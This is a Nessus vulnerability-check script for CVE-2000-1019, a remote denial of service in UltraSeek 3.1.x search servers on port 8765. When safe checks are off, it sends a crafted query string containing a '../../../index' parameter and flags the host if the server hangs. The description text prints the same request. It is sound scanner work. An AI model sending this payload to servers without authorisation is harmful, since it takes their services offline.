#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10542);
 script_bugtraq_id(1866);
 script_version ("$Revision: 1.16 $");
 script_cve_id("CVE-2000-1019");
 
 
 name["english"] = "UltraSeek 3.1.x Remote DoS";
 name["francais"] = "UltraSeek 3.1.x Remote DoS";
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "
It is possible to make the remote UltraSeek server hang temporarily
by requesting :
/index.html?&col=&ht=0&qs=&qc=&pw=100%25&ws=0&nh=10&lk=1&rf=0&si=1&si=1&ql=../../../index

An attacker may use this flaw to prevent this site from responding
to valid client requests.

Solution : Upgrade to UltraSeek 4.x
Risk factor : High";




 desc["francais"] = "
Il est possible d'empecher le serveur UltraSeek distant de répondre
pendant quelques temps en faisant la requete :
/index.html?&col=&ht=0&qs=&qc=&pw=100%25&ws=0&nh=10&lk=1&rf=0&si=1&si=1&ql=../../../index

Un pirate peut utiliser ce problème pour empecher ce site de
répondre aux requetes des clients.

Solution : mettez-le à jour en version 4.x
Facteur de risque : Sérieux";


 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "Hangs the remote UltraSeek server for some time";
 summary["francais"] = "Empeche le serveur UltraSeek distant de répondre";
 
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_MIXED_ATTACK);
 
 
 script_copyright(english:"This script is Copyright (C) 2000 Renaud Deraison",
		francais:"Ce script est Copyright (C) 2000 Renaud Deraison");
 family["english"] = "CGI abuses";
 family["francais"] = "Abus de CGI";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes");
 script_require_ports(8765);
 exit(0);
}

#
# The script code starts here
#

include("http_func.inc");

port = 8765;
if(get_port_state(port))
{
 if(safe_checks())
 {
  banner = get_http_banner(port:port);
  
  if(banner)
  {
   if("UltraSeek/3.1" >< banner)
   {
    alrt = "
The remote UltraSeek server is vulnerable to a denial
of service attack, when issued specially crafted
arguments.

*** Nessus reports this vulnerability using only
*** information that was gathered. Use caution
*** when testing without safe checks enabled.

Solution : Upgrade to version 4.0
Risk factor : High";

     security_hole(port:8765, data:alrt);
   }
  }
  exit(0);
 }
 
 req1 = http_head(item:"/", port:8765);
 soc = http_open_socket(8765);
 if(!soc)exit(0);
 send(socket:soc, data:req1);
 r = http_recv(socket:soc);
 http_close_socket(soc);
 if("200 OK" >< r)
 {
 soc = http_open_socket(8765);
 if(!soc)exit(0);
 req = http_get(item:"/index.html?&col=&ht=0&qs=&qc=&pw=100%25&ws=0&nh=10&lk=1&rf=0&si=1&si=1&ql=../../../index",
 	 port:8765);
 send(socket:soc, data:req);
 r = http_recv(socket:soc);
 http_close_socket(soc);
 if(!r)security_hole(8765);
 }
}
